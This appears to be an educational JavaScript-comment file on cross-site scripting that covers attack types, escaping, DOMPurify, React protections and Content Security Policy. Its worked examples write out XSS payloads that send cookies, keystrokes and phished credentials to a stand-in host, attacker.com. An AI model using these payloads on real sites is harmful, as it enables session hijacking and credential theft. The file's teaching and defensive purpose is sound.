                                                   /** CROSS SITE SCRIPTING */  

                                                   // THATS ALL YOU NEED TO UNDERSTAND EVERYTHING ABOUT XSS

/**
 * WHAT IS CROSS-SITE SCRIPTING (XSS)? IN-DEPTH EXPLANATION STEP BY STEP
 *
 * Cross-Site Scripting (XSS) is a security vulnerability that allows attackers
 * to inject malicious scripts into web pages viewed by other users. These scripts
 * execute in the victim's browser, enabling attackers to steal sensitive information,
 * hijack user sessions, or perform actions on behalf of the user.
 *
 * **Step-by-Step Explanation:**
 *
 * 1. **Identification of Injection Point:**
 *    - The attacker finds a point in the web application where user input is
 *      incorporated into the output without proper sanitization or encoding.
 *    - Common injection points include form inputs, URL parameters, and HTTP headers.
 *
 * 2. **Crafting the Malicious Payload:**
 *    - The attacker creates a script payload designed to perform malicious actions.
 *    - This could be JavaScript code that steals cookies, logs keystrokes, or redirects users.
 *
 * 3. **Injecting the Payload:**
 *    - The attacker submits the payload through the vulnerable input point.
 *    - In Stored XSS, the payload is stored on the server (e.g., in a database).
 *    - In Reflected XSS, the payload is immediately reflected back in the HTTP response.
 *
 * 4. **Execution of Malicious Script:**
 *    - When a victim visits the affected page, the browser executes the injected script.
 *    - The script runs with the same privileges as the legitimate scripts on the page.
 *
 * 5. **Exploitation:**
 *    - The malicious script performs actions like stealing cookies, modifying page content,
 *      or making unauthorized requests to the server.
 *
 * **Types of XSS Attacks:**
 *
 * - **Stored XSS (Persistent):**
 *   - The malicious script is permanently stored on the target server.
 *   - Affects all users who access the compromised content.
 *
 * - **Reflected XSS (Non-Persistent):**
 *   - The script is reflected off the web server in an error message, search result,
 *     or any other response that includes user input.
 *   - Requires the victim to click on a malicious link or submit a specially crafted request.
 *
 * - **DOM-Based XSS:**
 *   - The vulnerability exists in client-side scripts that manipulate the DOM.
 *   - Occurs when the web application writes data to the DOM without proper sanitization.
 */

/**
 * POSSIBLE WAYS OF XSS?
 *
 * 1. **Unsanitized User Inputs:**
 *    - Input fields like comments, usernames, or any form where users can submit data.
 *    - **Example:**
 *      - A comment box that allows users to post messages.
 *      - An attacker submits: `<script>alert('XSS Attack');</script>`
 *      - If not sanitized, this script will execute in the browser of anyone viewing the comment.
 *
 * 2. **URL Parameters:**
 *    - Query parameters in URLs that are reflected back into the page content.
 *    - **Example:**
 *      - A search page that displays the search query.
 *      - URL: `http://example.com/search?q=<script>maliciousCode()</script>`
 *      - If the `q` parameter is not properly escaped, the script executes.
 *
 * 3. **HTTP Headers:**
 *    - Custom headers like `User-Agent` or `Referer` that might be logged or displayed.
 *    - **Example:**
 *      - An attacker sets the `Referer` header to a malicious script.
 *      - If the application displays this header without sanitization, XSS can occur.
 *
 * 4. **Third-Party Widgets or Libraries:**
 *    - Insecure or compromised external scripts included in the application.
 *    - **Example:**
 *      - Including a script from a third-party CDN without verifying its integrity.
 *      - If the script is malicious, it can execute unwanted code.
 *
 * 5. **Insecure Direct Object References:**
 *    - Directly referencing objects like files or database entries without proper access control.
 *    - **Example:**
 *      - Loading content based on a filename provided in the URL.
 *      - If not validated, an attacker could load scripts from unintended locations.
 *
 * 6. **File Uploads:**
 *    - Allowing users to upload files that are served back without proper validation.
 *    - **Example:**
 *      - An attacker uploads an HTML file with embedded JavaScript.
 *      - When accessed, the script executes in the context of the application.
 *
 * 7. **DOM Manipulation via Client-Side Scripts:**
 *    - Using methods like `innerHTML`, `document.write`, or jQuery's `.html()` with untrusted data.
 *    - **Example:**
 *      - `element.innerHTML = userInput;`
 *      - If `userInput` contains HTML or scripts, it can lead to XSS.
 */

/**
 * THINGS THAT CAN SAVE US FROM XSS ATTACKS?
 *
 * 1. **Input Validation and Sanitization:**
 *    - Validate user inputs against expected formats and reject disallowed characters.
 *    - Sanitize inputs by removing or encoding dangerous characters.
 *
 * 2. **Output Encoding (Escaping):**
 *    - Encode user-supplied data before rendering it in the browser.
 *    - Use appropriate encoding based on the context (HTML, JavaScript, CSS, URL).
 *
 * 3. **Content Security Policy (CSP):**
 *    - Implement CSP headers to restrict sources of content like scripts, styles, and images.
 *    - Helps prevent execution of unauthorized scripts.
 *
 * 4. **HTTPOnly and Secure Cookies:**
 *    - Set cookies with the `HttpOnly` flag to prevent access via JavaScript.
 *    - Use the `Secure` flag to ensure cookies are only sent over HTTPS.
 *
 * 5. **Avoid Dangerous Functions:**
 *    - Refrain from using `eval()`, `setTimeout()` with strings, or `document.write()` with untrusted data.
 *
 * 6. **Use Safe APIs:**
 *    - Prefer `textContent` or `innerText` over `innerHTML` for inserting text into the DOM.
 *    - Use DOM manipulation methods that do not parse HTML.
 *
 * 7. **Security Libraries and Frameworks:**
 *    - Utilize libraries that handle sanitization and encoding (e.g., DOMPurify).
 *    - Use frameworks like React or Angular that have built-in XSS protections.
 *
 * 8. **Regular Security Audits:**
 *    - Conduct code reviews and penetration testing to identify vulnerabilities.
 *
 * 9. **Education and Awareness:**
 *    - Train developers on secure coding practices and the risks of XSS.
 */

/**
 * REAL-WORLD EXAMPLE OF USER SESSION HIJACKING
 *
 * **Scenario:**
 * A social media platform allows users to post status updates. The input is not properly sanitized.
 *
 * **Attack:**
 * An attacker posts a status containing a malicious script:
 *
 * ```html
 * <script>
 *   // Steal the user's session cookie
 *   fetch('http://attacker.com/steal?cookie=' + document.cookie);
 * </script>
 * ```
 *
 * **Explanation:**
 * - When other users view the attacker's status, their browsers execute the script.
 * - `document.cookie` retrieves the user's cookies, including session tokens.
 * - The script sends the cookies to the attacker's server via a GET request.
 *
 * **Impact:**
 * - The attacker can use the stolen session cookies to impersonate users.
 * - Access to personal data, messages, and the ability to perform actions as the user.
 */

/**
 * REAL-WORLD EXAMPLE OF UNAUTHORIZED ACCESS USING IMAGE ONERROR
 *
 * **Scenario:**
 * A web application displays user-uploaded images without sanitizing attributes.
 *
 * **Attack:**
 * An attacker uploads an image with an `onerror` event handler:
 *
 * ```html
 * <img src="nonexistent.jpg" onerror="
 *   fetch('http://attacker.com/steal?cookie=' + encodeURIComponent(document.cookie));
 * " />
 * ```
 *
 * **Explanation:**
 * - The `src` points to a nonexistent image, triggering the `onerror` event.
 * - The `onerror` handler executes the malicious script.
 * - The script sends the user's cookies to the attacker's server.
 *
 * **Impact:**
 * - Similar to the previous example, the attacker can hijack user sessions.
 *
 * **Mitigation:**
 * - Sanitize all attributes of HTML elements, disallowing event handlers like `onerror`.
 * - Use a whitelist approach for allowed attributes.
 */

/**
 * IN-DEPTH UNDERSTANDING OF HOW A HACKER CAN CAPTURE KEYSTROKES USING XSS
 *
 * **Scenario:**
 * An online banking application has a chat feature that displays messages without proper sanitization.
 *
 * **Attack:**
 * An attacker sends a chat message containing a keylogger script:
 *
 * ```html
 * <script>
 *   document.addEventListener('keydown', function(event) {
 *     fetch('http://attacker.com/log', {
 *       method: 'POST',
 *       body: JSON.stringify({ key: event.key }),
 *       headers: { 'Content-Type': 'application/json' }
 *     });
 *   });
 * </script>
 * ```
 *
 * **Explanation:**
 * - The script adds an event listener for all keydown events.
 * - Every key pressed by the user is sent to the attacker's server.
 * - Sensitive information like passwords and account numbers can be captured.
 *
 * **Impact:**
 * - Compromise of confidential data.
 * - Potential unauthorized transactions if login credentials are stolen.
 *
 * **Mitigation:**
 * - Always sanitize user inputs before rendering them.
 * - Implement CSP to restrict script sources and prevent inline scripts.
 */

/**
 * XSS PHISHING ATTACKS EXAMPLE IN-DEPTH UNDERSTANDING
 *
 * **Scenario:**
 * A corporate webmail application allows users to customize their dashboard widgets.
 *
 * **Attack:**
 * An attacker creates a widget with a malicious script:
 *
 * ```html
 * <script>
 *   // Display a fake login prompt
 *   var div = document.createElement('div');
 *   div.innerHTML = `
 *     <div style="position:fixed; top:0; left:0; width:100%; height:100%;
 *                 background-color:white; z-index:1000; text-align:center;">
 *       <h2>Your session has expired. Please log in again.</h2>
 *       <form action="http://attacker.com/phish" method="POST">
 *         Username: <input type="text" name="username" /><br />
 *         Password: <input type="password" name="password" /><br />
 *         <input type="submit" value="Log In" />
 *       </form>
 *     </div>
 *   `;
 *   document.body.appendChild(div);
 * </script>
 * ```
 *
 * **Explanation:**
 * - The script creates a full-screen overlay mimicking a session timeout.
 * - Users enter their credentials into the fake form.
 * - The form submits the credentials to the attacker's server.
 *
 * **Impact:**
 * - Attacker gains access to user accounts.
 * - Potential for data theft and unauthorized actions within the corporate network.
 *
 * **Mitigation:**
 * - Sanitize user-generated content to prevent script execution.
 * - Educate users to verify URLs and be cautious of unexpected login prompts.
 */

/**
 * ALL POSSIBLE MITIGATIONS THAT CAN SAVE US FROM XSS
 *
 * 1. **Input Validation:**
 *    - Enforce strict input validation on all user inputs.
 *    - Use whitelisting to allow only expected characters and formats.
 *
 * 2. **Output Encoding:**
 *    - Encode data based on the context where it is used (HTML, JavaScript, CSS).
 *    - Use libraries or frameworks that handle encoding automatically.
 *
 * 3. **Content Security Policy (CSP):**
 *    - Implement CSP headers to control which resources can be loaded.
 *    - Use nonces or hashes to allow only specific inline scripts.
 *
 * 4. **Sanitization Libraries:**
 *    - Use trusted libraries like DOMPurify to sanitize HTML content.
 *    - Ensure libraries are kept up to date.
 *
 * 5. **Avoid Inline JavaScript and CSS:**
 *    - Do not include inline scripts or styles in your HTML.
 *    - Keep JavaScript and CSS in external files.
 *
 * 6. **Use HTTPOnly and Secure Flags on Cookies:**
 *    - Prevent cookies from being accessed via JavaScript.
 *    - Ensure cookies are only transmitted over secure channels.
 *
 * 7. **Use Frameworks with Built-in Protections:**
 *    - Utilize frameworks like React or Angular that auto-escape content.
 *
 * 8. **Proper Attribute Handling:**
 *    - Be cautious with attributes like `src`, `href`, and event handlers.
 *    - Validate and sanitize URLs and ensure they don't contain `javascript:` schemes.
 *
 * 9. **Limit User Input Length:**
 *    - Restrict the length of user inputs to what is necessary.
 *    - Reduces the risk of large payloads.
 *
 * 10. **Regular Security Training:**
 *     - Keep developers informed about the latest security best practices.
 *
 * 11. **Security Testing:**
 *     - Incorporate automated security testing tools in the development process.
 *     - Perform regular penetration testing.
 *
 * 12. **Use Subresource Integrity (SRI):**
 *     - When including external scripts, use SRI to ensure they haven't been tampered with.
 *
 * 13. **Implement a Bug Bounty Program:**
 *     - Encourage external security researchers to find and report vulnerabilities.
 */

/**
 * NEVER USE `innerHTML`: IN-DEPTH EXPLANATION WHY
 *
 * **Explanation:**
 * - `innerHTML` sets or gets the HTML content of an element as a string.
 * - When using `innerHTML` with untrusted data, the browser parses the string
 *   and can execute any scripts or event handlers within it.
 *
 * **Risks:**
 * - **XSS Attacks:**
 *   - Attackers can inject malicious HTML or scripts that execute in the user's browser.
 *
 * - **Event Handler Injection:**
 *   - Malicious attributes like `onclick`, `onerror`, etc., can be added to elements.
 *
 * **Example of Vulnerable Code:**
 *
 * ```javascript
 * // Untrusted user input
 * var userComment = getUserComment(); // "<img src='x' onerror='stealCookies()'>"
 *
 * // Vulnerable usage
 * commentSection.innerHTML += `<p>${userComment}</p>`;
 * ```
 *
 * - The `onerror` attribute executes when the image fails to load, running `stealCookies()`.
 *
 * **Safe Alternatives:**
 *
 * - **Use `textContent` or `innerText`:**
 *   - These properties set the text content of a node, not interpreting HTML.
 *   - **Example:**
 *     ```javascript
 *     var commentParagraph = document.createElement('p');
 *     commentParagraph.textContent = userComment;
 *     commentSection.appendChild(commentParagraph);
 *     ```
 *
 * - **Create Elements Programmatically:**
 *   - Build the DOM structure using `createElement` and `setAttribute`.
 *   - **Example:**
 *     ```javascript
 *     var img = document.createElement('img');
 *     img.src = 'user-provided-src.jpg';
 *     img.alt = 'User Image';
 *     imageContainer.appendChild(img);
 *     ```
 *
 * **Summary:**
 * - Avoid using `innerHTML` with untrusted data to prevent XSS vulnerabilities.
 * - Always prefer methods that do not interpret or execute HTML content from users.
 */

/**
 * WHAT IS ESCAPING AND HOW CAN IT SAVE US FROM XSS?
 *
 * **Escaping Defined:**
 * - Escaping is the process of converting special characters in a string into
 *   their corresponding HTML entities.
 * - This ensures that the characters are treated as literal text rather than
 *   executable code.
 *
 * **How It Works:**
 * - Characters like `<`, `>`, `&`, `"`, and `'` are replaced with `&lt;`, `&gt;`,
 *   `&amp;`, `&quot;`, and `&#39;` respectively.
 *
 * **Example:**
 *
 * - **User Input:**
 *   ```html
 *   <script>alert('XSS');</script>
 *   ```
 * - **Escaped Output:**
 *   ```html
 *   &lt;script&gt;alert('XSS');&lt;/script&gt;
 *   ```
 * - The browser displays the tags as text instead of executing the script.
 *
 * **Why It's Important:**
 * - Prevents malicious scripts from being executed in the user's browser.
 * - Ensures that user-generated content is displayed safely.
 *
 * **Contextual Escaping:**
 * - **HTML Escaping:**
 *   - For content inserted into HTML bodies.
 * - **Attribute Escaping:**
 *   - For content placed within HTML attributes.
 * - **JavaScript Escaping:**
 *   - For content inserted into JavaScript code.
 * - **URL Encoding:**
 *   - For content included in URLs or query parameters.
 *
 * **Using Libraries:**
 * - Use trusted libraries to handle escaping, as manual methods can be error-prone.
 * - Examples include:
 *   - **lodash.escape**
 *   - **Handlebars (auto-escaping by default)**
 *   - **OWASP ESAPI**
 *
 * **Implementation Example:**
 *
 * ```javascript
 * function escapeHTML(str) {
 *   return str.replace(/&/g, '&amp;')
 *             .replace(/</g, '&lt;')
 *             .replace(/>/g, '&gt;')
 *             .replace(/"/g, '&quot;')
 *             .replace(/'/g, '&#39;');
 * }
 *
 * var safeComment = escapeHTML(userComment);
 * commentSection.innerHTML = safeComment; // Still risky; better to use textContent
 * ```
 *
 * **Note:**
 * - Even when escaping, avoid using `innerHTML` if possible.
 * - Always ensure that the escaping function covers all special characters.
 */

/**
 * HOW DOES REACT AUTOMATICALLY HANDLE MOST OF THE THINGS TO SAVE US FROM XSS ATTACKS?
 *
 * **React's Protective Measures:**
 *
 * 1. **Automatic Escaping of Content:**
 *    - React escapes all strings before rendering them into the DOM.
 *    - Converts special characters to their HTML entities.
 *    - **Example:**
 *      ```jsx
 *      const userInput = "<img src='x' onerror='stealCookies()' />";
 *      <div>{userInput}</div>
 *      ```
 *      - React renders the input as plain text, displaying the `<img>` tag without interpreting it.
 *
 * 2. **Virtual DOM Rendering:**
 *    - React uses a virtual DOM to manage UI updates.
 *    - Minimizes direct DOM manipulation, reducing XSS vectors.
 *
 * 3. **Discouraging Dangerous APIs:**
 *    - React makes it explicit when you are doing something potentially unsafe.
 *    - **`dangerouslySetInnerHTML`:**
 *      - Requires developers to opt-in consciously.
 *      - Reminds developers to ensure the content is safe.
 *
 * 4. **Component-Based Architecture:**
 *    - Encourages encapsulation and reuse of secure components.
 *    - Components can manage their own state and validation.
 *
 * 5. **Event Handling Security:**
 *    - React's synthetic event system normalizes events and can prevent certain types of attacks.
 *
 * **Limitations and Developer Responsibilities:**
 *
 * - **External Data Sources:**
 *   - Data fetched from APIs or external sources must be sanitized.
 *
 * - **Attribute Injection:**
 *   - Be cautious when setting attributes like `href`, `src`, or event handlers with user data.
 *
 * - **Using `dangerouslySetInnerHTML`:**
 *   - Only use it when absolutely necessary.
 *   - Always sanitize the HTML content before injecting.
 *
 * **Best Practices with React:**
 *
 * - **Avoid Inline Styles and Scripts:**
 *   - Keep styles and scripts in their respective files.
 *
 * - **Validate and Sanitize Inputs:**
 *   - Perform validation at both client and server sides.
 *
 * - **Use PropTypes and TypeScript:**
 *   - Enforce type checking to prevent unexpected data types.
 *
 * **Summary:**
 * - React provides a layer of protection against XSS by escaping content.
 * - Developers must still practice secure coding and handle external data carefully.
 */

/**
 * WHAT DOES DOMPurify LIBRARY DO AND HOW DOES IT WORK UNDER THE HOOD?
 *
 * **Purpose of DOMPurify:**
 * - DOMPurify is a library that sanitizes HTML and prevents XSS attacks.
 * - It cleans untrusted HTML input, ensuring it's safe to insert into the DOM.
 *
 * **How It Works:**
 *
 * 1. **Parsing the HTML:**
 *    - DOMPurify uses the browser's DOMParser to parse the input string into a DOM tree.
 *
 * 2. **Sanitization Process:**
 *    - Traverses the DOM tree, inspecting each node and attribute.
 *    - Removes or sanitizes elements and attributes that are potentially dangerous.
 *    - Strips out scripts, event handlers, and disallowed tags.
 *
 * 3. **Reconstruction of Safe HTML:**
 *    - After sanitization, the cleaned DOM is serialized back into an HTML string.
 *
 * **Features:**
 *
 * - **Configurable Policies:**
 *   - Allows customization of allowed tags and attributes.
 *   - Can enable or disable specific features.
 *
 * - **Support for Various Contexts:**
 *   - Handles HTML, MathML, and SVG content.
 *
 * - **Performance Optimizations:**
 *   - Designed to be fast and efficient for real-time applications.
 *
 * **Example Usage:**
 *
 * ```javascript
 * // Untrusted HTML input
 * var dirtyHTML = '<img src="x" onerror="stealCookies()" />' +
 *                 '<p onclick="doEvil()">Hello World</p>';
 *
 * // Sanitize the HTML
 * var cleanHTML = DOMPurify.sanitize(dirtyHTML);
 *
 * // Insert into the DOM
 * document.getElementById('content').innerHTML = cleanHTML;
 * ```
 *
 * **Under the Hood:**
 * - **Tag Whitelisting:**
 *   - Only allows safe tags (e.g., `<b>`, `<i>`, `<p>`) and removes others.
 *
 * - **Attribute Whitelisting:**
 *   - Permits safe attributes like `href`, `src`, `alt`.
 *   - Strips out event handlers like `onclick`, `onerror`.
 *
 * - **URL Validation:**
 *   - Checks URLs in attributes to prevent `javascript:` or `data:` schemes.
 *
 * **Benefits:**
 * - **Security:**
 *   - Provides robust protection against XSS.
 *
 * - **Ease of Use:**
 *   - Simple API for sanitizing strings.
 *
 * - **Flexibility:**
 *   - Customizable to fit different security requirements.
 *
 * **Conclusion:**
 * - DOMPurify is a reliable tool for sanitizing HTML content.
 * - It should be used whenever untrusted HTML needs to be rendered.
 */

/**
 * WHY SHOULD WE NEVER EVER USE `dangerouslySetInnerHTML`? HOW IS IT HARMFUL AND WHAT CAN IT CAUSE?
 *
 * **Understanding `dangerouslySetInnerHTML`:**
 * - In React, `dangerouslySetInnerHTML` allows you to directly set HTML content of a component.
 * - It bypasses React's built-in protections against XSS.
 *
 * **Risks:**
 * - **XSS Vulnerabilities:**
 *   - If the HTML content is not properly sanitized, it can contain malicious scripts.
 *   - These scripts will execute in the user's browser, leading to XSS attacks.
 *
 * - **Security Responsibility:**
 *   - Places the burden of ensuring content safety on the developer.
 *
 * **Potential Consequences:**
 * - **Data Theft:**
 *   - Attackers can steal sensitive user data like cookies or local storage.
 *
 * - **Session Hijacking:**
 *   - Unauthorized access to user accounts.
 *
 * - **Reputation Damage:**
 *   - Users may lose trust in the application.
 *
 * **Example of Risky Usage:**
 *
 * ```jsx
 * function DisplayContent({ htmlContent }) {
 *   return (
 *     <div dangerouslySetInnerHTML={{ __html: htmlContent }} />
 *   );
 * }
 * ```
 *
 * - If `htmlContent` comes from an untrusted source, it may include harmful scripts.
 *
 * **Safe Practices:**
 *
 * - **Sanitize Content:**
 *   - Always sanitize HTML content before using it with `dangerouslySetInnerHTML`.
 *   - Use libraries like DOMPurify.
 *
 * - **Avoid Using When Possible:**
 *   - Prefer rendering content using React components and props.
 *
 * **Example with Sanitization:**
 *
 * ```jsx
 * import DOMPurify from 'dompurify';
 *
 * function DisplayContent({ htmlContent }) {
 *   const cleanHTML = DOMPurify.sanitize(htmlContent);
 *   return (
 *     <div dangerouslySetInnerHTML={{ __html: cleanHTML }} />
 *   );
 * }
 * ```
 *
 * **Conclusion:**
 * - `dangerouslySetInnerHTML` should be used with extreme caution.
 * - Always ensure that the content is sanitized to protect users from XSS attacks.
 */

/**
 * CONTENT SECURITY POLICY (CSP) IN-DEPTH EXPLANATION
 *
 * **What is Content Security Policy (CSP)?**
 *
 * - CSP is a security standard that helps prevent Cross-Site Scripting (XSS),
 *   clickjacking, and other code injection attacks.
 * - It allows web developers to specify which sources of content are trusted.
 *
 * **How CSP Works:**
 *
 * - Implemented via HTTP headers (`Content-Security-Policy`) or `<meta>` tags.
 * - Defines directives that control where resources can be loaded from.
 * - The browser enforces these policies when rendering the page.
 *
 * **Key CSP Directives and When to Use Them:**
 *
 * 1. **default-src**
 *    - **Purpose:** Serves as a fallback for other directives.
 *    - **Usage:** Always include to set a baseline policy.
 *    - **Example:**
 *      ```
 *      Content-Security-Policy: default-src 'self';
 *      ```
 *    - **Explanation:** Only content from the same origin is allowed.
 *
 * 2. **script-src**
 *    - **Purpose:** Controls allowed sources for JavaScript.
 *    - **Usage:** Use to prevent execution of malicious scripts.
 *    - **Example:**
 *      ```
 *      Content-Security-Policy: script-src 'self' https://apis.example.com;
 *      ```
 *    - **Explanation:** Scripts can only be loaded from the same origin and specified domains.
 *    - **Best Practices:**
 *      - Avoid `'unsafe-inline'`.
 *      - Use nonces or hashes for inline scripts.
 *
 * 3. **style-src**
 *    - **Purpose:** Specifies allowed sources for stylesheets.
 *    - **Usage:** Control where styles are loaded from.
 *    - **Example:**
 *      ```
 *      Content-Security-Policy: style-src 'self' https://fonts.googleapis.com;
 *      ```
 *    - **Explanation:** Allows styles from the same origin and Google Fonts.
 *
 * 4. **img-src**
 *    - **Purpose:** Defines allowed sources for images.
 *    - **Usage:** Prevent loading images from untrusted sources.
 *    - **Example:**
 *      ```
 *      Content-Security-Policy: img-src 'self' data:;
 *      ```
 *    - **Explanation:** Images can be loaded from the same origin and data URIs.
 *
 * 5. **connect-src**
 *    - **Purpose:** Controls sources for XMLHttpRequest, Fetch API, WebSocket connections.
 *    - **Usage:** Restrict where scripts can send data.
 *    - **Example:**
 *      ```
 *      Content-Security-Policy: connect-src 'self' https://api.example.com;
 *      ```
 *
 * 6. **font-src**
 *    - **Purpose:** Specifies allowed sources for fonts.
 *    - **Usage:** Control from where fonts can be loaded.
 *    - **Example:**
 *      ```
 *      Content-Security-Policy: font-src 'self' https://fonts.gstatic.com;
 *      ```
 *
 * 7. **object-src**
 *    - **Purpose:** Restricts loading of plugins like Flash or Java.
 *    - **Usage:** Set to `'none'` if not using plugins.
 *    - **Example:**
 *      ```
 *      Content-Security-Policy: object-src 'none';
 *      ```
 *
 * 8. **media-src**
 *    - **Purpose:** Defines sources for media files (`<audio>`, `<video>`).
 *    - **Usage:** Specify if loading media from external sources.
 *
 * 9. **frame-src**
 *    - **Purpose:** Controls allowed sources for framing (`<frame>`, `<iframe>`).
 *    - **Usage:** Prevent clickjacking by restricting framing.
 *    - **Example:**
 *      ```
 *      Content-Security-Policy: frame-src 'self';
 *      ```
 *
 * 10. **form-action**
 *     - **Purpose:** Restricts where forms can be submitted.
 *     - **Usage:** Prevent form data from being sent to malicious sites.
 *     - **Example:**
 *       ```
 *       Content-Security-Policy: form-action 'self';
 *       ```
 *
 * 11. **frame-ancestors**
 *     - **Purpose:** Specifies which sites can embed your content.
 *     - **Usage:** Protect against clickjacking.
 *     - **Example:**
 *       ```
 *       Content-Security-Policy: frame-ancestors 'none';
 *       ```
 *
 * 12. **base-uri**
 *     - **Purpose:** Restricts the URLs allowed in a document's `<base>` element.
 *     - **Usage:** Prevent attackers from changing the base URL.
 *     - **Example:**
 *       ```
 *       Content-Security-Policy: base-uri 'self';
 *       ```
 *
 * 13. **upgrade-insecure-requests**
 *     - **Purpose:** Instructs browsers to upgrade HTTP requests to HTTPS.
 *     - **Usage:** Ensure all content is loaded securely.
 *     - **Example:**
 *       ```
 *       Content-Security-Policy: upgrade-insecure-requests;
 *       ```
 *
 * 14. **block-all-mixed-content**
 *     - **Purpose:** Blocks loading of any assets using HTTP when on HTTPS.
 *     - **Usage:** Enforce secure content loading.
 *     - **Example:**
 *       ```
 *       Content-Security-Policy: block-all-mixed-content;
 *       ```
 *
 * **Implementing CSP:**
 *
 * - **Start with Report-Only Mode:**
 *   - Use `Content-Security-Policy-Report-Only` to monitor violations without enforcing.
 *   - Adjust policies based on reports.
 *
 * - **Set CSP Headers:**
 *   - Configure your web server or application to send CSP headers.
 *   - Example in Express.js:
 *     ```javascript
 *     app.use((req, res, next) => {
 *       res.setHeader('Content-Security-Policy', "default-src 'self'; script-src 'self'");
 *       next();
 *     });
 *     ```
 *
 * **Best Practices:**
 *
 * - **Be Specific:**
 *   - Only allow sources that are necessary.
 *
 * - **Avoid Wildcards:**
 *   - Do not use `*` as it defeats CSP's purpose.
 *
 * - **Use Nonces or Hashes:**
 *   - For inline scripts and styles, use nonces or hashes instead of `'unsafe-inline'`.
 *
 * - **Regularly Update Policies:**
 *   - Review and adjust CSP directives as your application changes.
 *
 * - **Test Thoroughly:**
 *   - Ensure that your CSP doesn't break legitimate functionality.
 *
 * **Conclusion:**
 * - CSP is a powerful tool to enhance web application security.
 * - Proper implementation requires understanding your content sources.
 * - When used correctly, CSP significantly reduces the risk of XSS and related attacks.
 */
